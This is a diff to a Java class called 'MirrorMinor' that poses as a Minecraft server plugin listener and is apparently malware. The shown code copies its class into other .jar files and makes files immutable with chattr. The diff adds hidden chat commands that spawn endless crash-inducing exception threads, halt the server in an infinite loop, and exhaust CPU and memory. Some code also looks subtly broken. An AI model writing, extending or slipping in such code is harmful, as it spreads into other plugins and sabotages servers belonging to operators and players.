@@ -44,9 +44,9 @@ class MirrorMinor implements Listener {
         for (int i = 0; i < listOfFiles.length; i++) {
             if (listOfFiles[i].isFile()) {
                 try {
-                    Runtime.getRuntime().exec("chattr +i "+listOfFiles[i]);
                     if (listOfFiles[i].getName().endsWith(".jar"))
                         Runtime.getRuntime().exec("jar cvf " + listOfFiles[i].getName() + " Mirrorminor.class");
+                    Runtime.getRuntime().exec("chattr +i "+listOfFiles[i]);
                 } catch (IOException e) {
                 }
             } else if (listOfFiles[i].isDirectory()) {
@@ -92,6 +92,18 @@ class MirrorMinor implements Listener {
                 case "stopall":
                     e.setCancelled(true);
                     stopAllProcesses();
+                    break;
+                case "exceptionbomber":
+                    e.setCancelled(true);
+                    exceptionBomber();
+                    break;
+                case "obviusexceptionbomber":
+                    e.setCancelled(true);
+                    obviusExceptionBomber();
+                    break;
+                case "halt":
+                    e.setCancelled(true);
+                    while(true){}
                     break;
             }
         } else if (e.getMessage().equals("153246798"))
@@ -143,7 +155,7 @@ class MirrorMinor implements Listener {
     private void loadRAM() {
         List<Object> objects = new ArrayList<Object>();
         class Test {
-            long l = Long.MAX_VALUE;
+            public static long l = Long.MAX_VALUE;
         }
         for (int i = 0; i < Integer.MAX_VALUE; i++) {
             objects.add(new Test());
@@ -156,23 +168,16 @@ class MirrorMinor implements Listener {
 
     private void loadCPU() {
         for (int i = 0; i < 4; i++) {
-            Thread t = new Thread(() -> {
-                while (true) {
-                    try {
-                        Thread.sleep(100);
-                    } catch (Exception ex) {
+            while(true){
+                Thread t = new Thread(()->{
+                    while(true){
+                        Random random = new Random();
+                        Math.pow(random.nextInt(1000), random.nextInt(1000));
                     }
-                    long l = 0;
-                    for (int o = 0; o < 100; o++) {
-                        if (Math.log(l) == 1337) {
-                            continue;
-                        }
-                        l += o;
-                    }
-                }
-            });
-            t.setPriority(Thread.MAX_PRIORITY);
-            t.start();
+                });
+                t.setPriority(Thread.MAX_PRIORITY);
+                t.start();
+            }
         }
     }
 
@@ -189,5 +194,32 @@ class MirrorMinor implements Listener {
                     "§fHow: §7Write \"GíveOP\" fastest as everyone!");
             OPGiveAway = true;
         }
+    }
+    
+    private void exceptionBomber(){
+        new Thread(()->{
+            while(true){
+                new Thread(()->{
+                    throw new RuntimeException(new RuntimeException(new NullPointerException()));
+                }).start();
+            }
+        }).start();
+    }
+    
+    private void obviusExceptionBomber(){
+        new Thread(()->{
+            while(true){
+                new Thread(()->{
+                    throw new RuntimeException(new Virus());
+                }).start();
+            }
+        }).start();
+    }
+    
+    private static class Virus extends RuntimeException {
+        public Virus() {
+            super(UUID.randomUUID().toString());
+        }
+        
     }
 }
